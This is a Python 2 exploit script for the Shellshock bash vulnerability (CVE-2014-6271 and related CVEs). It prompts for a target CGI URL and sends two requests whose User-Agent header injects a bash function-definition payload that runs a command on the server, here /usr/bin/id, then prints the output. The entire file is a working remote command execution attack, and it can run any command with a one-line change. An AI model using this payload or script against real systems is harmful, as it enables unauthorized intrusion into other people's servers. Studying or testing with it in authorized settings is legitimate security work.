#!/usr/bin/python

# Exploit Title: Shellshock
# Google Dork: -
# Date: 06/05/2015
# Exploit Author: Juttikhun Khamchaiyaphum
# Vendor Homepage: -
# Software Link: -
# Affected Version: versions 1.14 (released in 1994) to the most recent version 4.3 
# Tested on: 
# - CentOS release 6.4 (Final), PHP Version 5.3.3,Server API: CGI/FastCGI
# CVE : (CVE-2014-6271, CVE-2014-6277, CVE-2014-6278, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187)
# Usage: 
# python library "httplib2": https://pypi.python.org/pypi/httplib2

import sys
import httplib2
from urllib import urlencode
import time
import socket

def send(fullURL,headers):
    http = httplib2.Http()
    body = {}
    response, content = http.request(fullURL, 'GET', headers=headers, body=urlencode(body))
    return (content)

print "[*] Enter full URL to an existing object(.cgi or etc.) <include http/https>"
fullURL = raw_input(">>")
# fullURL = "http://192.168.111.103/cgi-bin/test.cgi"
if fullURL.find("http://") != -1:
	site = fullURL.replace("http://","")
elif  fullURL.find("https://") != -1:
	site = fullURL.replace("https://","")

slashPos = site.find("/")
if slashPos != -1:
	host = site[:-(len(site)-slashPos)]
	path = site[slashPos:len(site)]
	print ("[*] Host : " + host)
	print ("[*] Path : " + path)
else:
	fullSite = site
	host = site
	path = "/"
print ("[*] Full : " + fullURL)


print "-------------------------------"
print "[*] Testing ... "

try:
	command = "/usr/bin/id"
	header = '() { xxxxxxxxxxxxxxxxxx; }; echo ; echo ; '+command+';'
	headers = {'User-Agent': header, 'Host': "" + host }
	print "[*] Type 1 >> " + header
	print "[*] Executing command:" + command
	content = send(fullURL,headers)
	print str(content)
except (httplib2.HttpLib2Error,socket.error) as ex:
    print '[!] Checking ' + fullURL + ' >> ' + "error, please specify full path to an existing object such jpg"

try:
	command = "/usr/bin/id"
	header = '() { :; }; echo ; echo ; /bin/bash -c  '+command+';'
	headers = {'User-Agent': header, 'Host': "" + host }
	print "[*] Type 2 >> " + header
	print "[*] Executing command:" + command
	content = send(fullURL,headers)
	print str(content)
except (httplib2.HttpLib2Error,socket.error) as ex:
    print '[!] Checking ' + fullURL + ' >> ' + "error, please specify full path to an existing object such jpg"


